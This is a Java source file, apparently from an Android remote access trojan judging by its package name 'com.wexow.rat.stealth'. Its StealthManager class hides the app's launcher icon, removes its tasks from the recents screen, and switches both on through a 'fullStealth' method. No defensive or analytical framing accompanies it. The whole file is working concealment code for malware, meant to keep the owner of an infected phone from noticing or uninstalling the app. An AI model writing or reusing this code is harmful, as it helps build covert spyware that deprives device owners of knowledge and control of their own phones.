package com.wexow.rat.stealth;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

public class StealthManager {
    private static final String TAG = "StealthManager";

    public static void hideAppIcon(Context ctx) {
        try {
            ComponentName cn = new ComponentName(ctx,
                ctx.getPackageName() + ".LauncherAlias");
            ctx.getPackageManager().setComponentEnabledSetting(
                cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.d(TAG, "Icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "hideIcon: " + e.getMessage());
        }
    }

    public static void showAppIcon(Context ctx) {
        try {
            ComponentName cn = new ComponentName(ctx,
                ctx.getPackageName() + ".LauncherAlias");
            ctx.getPackageManager().setComponentEnabledSetting(
                cn,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            Log.d(TAG, "Icon shown");
        } catch (Exception e) {
            Log.e(TAG, "showIcon: " + e.getMessage());
        }
    }

    public static void hideFromRecents(Context ctx) {
        try {
            ActivityManager am =
                (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                for (ActivityManager.AppTask t : am.getAppTasks()) {
                    t.setExcludeFromRecents(true);
                }
            }
        } catch (Exception ignored) {}
    }

    public static void fullStealth(Context ctx) {
        hideAppIcon(ctx);
        hideFromRecents(ctx);
        Log.d(TAG, "Full stealth activated");
    }
}